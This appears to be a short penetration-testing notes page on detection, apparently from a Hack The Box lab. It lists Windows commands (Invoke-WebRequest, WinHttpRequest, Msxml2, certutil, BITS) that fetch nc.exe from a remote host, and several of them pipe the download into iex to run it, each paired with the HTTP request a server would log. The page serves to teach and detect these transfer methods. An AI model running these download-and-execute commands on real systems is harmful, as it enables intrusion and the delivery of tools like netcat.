---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Detection

{% embed url="https://useragentstring.com/pages/useragentstring.php" %}

Invoke-WebRequest - Client

{% code fullWidth="true" %}
```
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
```
{% endcode %}

Invoke-WebRequest - Server

```
GET /nc.exe HTTP/1.1
```

WinHttpRequest - Client

```
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```

WinHttpRequest - Server

```
GET /nc.exe HTTP/1.1
```

Msxml2 - Client

```
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText
```

Msxml2 - Server

```
GET /nc.exe HTTP/1.1
```

Certutil - Client

```
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

Certutil - Server

```
GET /nc.exe HTTP/1.1
```

BITS - Client

```
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t; 
PS C:\htb> iex $r
```

BITS - Server

```
HEAD /nc.exe HTTP/1.1
```
